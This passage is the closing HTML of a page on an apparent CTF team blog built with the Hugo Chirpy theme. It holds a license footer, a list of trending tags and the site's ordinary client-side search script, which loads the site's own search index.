+<span data-bs-toggle=tooltip data-bs-placement=top title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p><p>Using the <a data-bs-toggle=tooltip data-bs-placement=top title=v1.0.2 href=https://github.com/geekifan/hugo-theme-chirpy target=_blank rel=noopener>Chirpy</a> theme for <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a>.</p></footer></div></div><div id=search-result-wrapper class="d-flex justify-content-center d-none"><div class="col-11 content"><div id=search-hints><section><h2 class=panel-heading>Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"><a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/crypto/>crypto</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/ctf/>ctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/flask/>flask</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/heroctf/>heroctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/hsctf/>hsctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/javascript/>javascript</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/jwt/>jwt</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/linux/>linux</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/logic-flaw/>logic flaw</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/pcap/>pcap</a></div></section></div><div id=search-results class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div><script>const DEFAULT_CONFIG={search:{minChars:1,maxResults:5,fields:{title:!0,description:!0,section:!0,contents:!0},strictMode:!0}};class FastSearch{constructor({searchInput:e,resultsContainer:t,json:n,searchResultTemplate:s=null,noResultsText:o=null}){this.searchInput=e,this.resultsContainer=t,this.json=n,this.searchResultTemplate=s,this.noResultsText=o,this.init()}init(){this.loadSearchIndex(),this.searchInput.addEventListener("input",e=>{if(!this.searchIndex){this.resultsContainer.innerHTML='<li class="search-message">Loading search index...</li>';return}this.performSearch(this.searchInput.value)})}async loadSearchIndex(){try{const e=await fetch(this.json);if(!e.ok)throw new Error("Failed to load search index");const t=await e.json();this.searchIndex=t.map(e=>({...e,searchableTitle:e.title?.toLowerCase()||"",searchableDesc:e.desc?.toLowerCase()||"",searchableSection:e.section?.toLowerCase()||"",searchableContents:e.contents?.toLowerCase()||""}))}catch(e){console.error("Error loading search index:",e),this.resultsContainer.innerHTML='<li class="search-message">Error loading search index...</li>'}}escapeHtml(e){return e?e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;"):""}containsTerm(e,t){return!!e&&!!t&&e.includes(t)}performSearch(e){if(e=e.toLowerCase().trim(),!e||!this.searchIndex||e.length<DEFAULT_CONFIG.search.minChars){this.resultsContainer.innerHTML="";return}const s=[e,...e.split(/\s+/).filter(e=>e.length>0)],t=[...new Set(s)],o=DEFAULT_CONFIG.search.strictMode,n=this.searchIndex.map(e=>{const s=this.checkFieldsForMatch(e,t[0]);if(o&&!s)return{item:e,score:0,matched:!1};let n=0,i=0,a=!1;t.forEach((t,s)=>{const r=s===0,o=this.checkFieldsForMatch(e,t);o&&(i++,o.inTitle&&(n+=r?10:5,a=!0),o.inDesc&&(n+=r?8:4),o.inSection&&(n+=r?6:3),o.inContents&&(n+=r?4:2))});const r=i/t.length,c=n*r*(a?1.5:1);return{item:e,score:c,matched:s}}).filter(e=>e.matched).sort((e,t)=>t.score-e.score).slice(0,DEFAULT_CONFIG.search.maxResults).map(e=>e.item);if(n.length===0){this.resultsContainer.innerHTML='<p class="mt-5">Oops! No results found.</p>';return}const i=n.map(e=>{let t="",n="";return e.categories&&(t=e.categories.join(", "),t=`<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${t}</div>`),e.tags&&(n=e.tags.join(", "),n=`<div><i class="fa fa-tag fa-fw"></i>${n}</div>`),`
+        <article class="px-1 px-sm-2 px-lg-4 px-xl-0">
+          <header>
+            <h2><a href="${this.escapeHtml(e.permalink)}">${this.escapeHtml(e.title)}</a></h2>
+            <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">
+              ${t}
+              ${n}
+            </div>
+          </header>
+          <p>${this.escapeHtml(e.contents)}</p>
+        </article>
+      `}).join("");this.resultsContainer.innerHTML=i}checkFieldsForMatch(e,t){const n={inTitle:!1,inDesc:!1,inSection:!1,inContents:!1};return DEFAULT_CONFIG.search.fields.title&&this.containsTerm(e.searchableTitle,t)&&(n.inTitle=!0),DEFAULT_CONFIG.search.fields.description&&this.containsTerm(e.searchableDesc,t)&&(n.inDesc=!0),DEFAULT_CONFIG.search.fields.section&&this.containsTerm(e.searchableSection,t)&&(n.inSection=!0),DEFAULT_CONFIG.search.fields.contents&&this.containsTerm(e.searchableContents,t)&&(n.inContents=!0),!!(n.inTitle||n.inDesc||n.inSection||n.inContents)&&n}}const search=new FastSearch({searchInput:document.getElementById("search-input"),resultsContainer:document.getElementById("search-results"),json:`/index.json`})</script></div><aside aria-label="Scroll to Top"><button id=back-to-top type=button class="btn btn-lg btn-box-shadow">
+<i class="fas fa-angle-up"></i></button></aside></div><div id=mask class="d-none position-fixed w-100 h-100 z-1"></div></body></html>
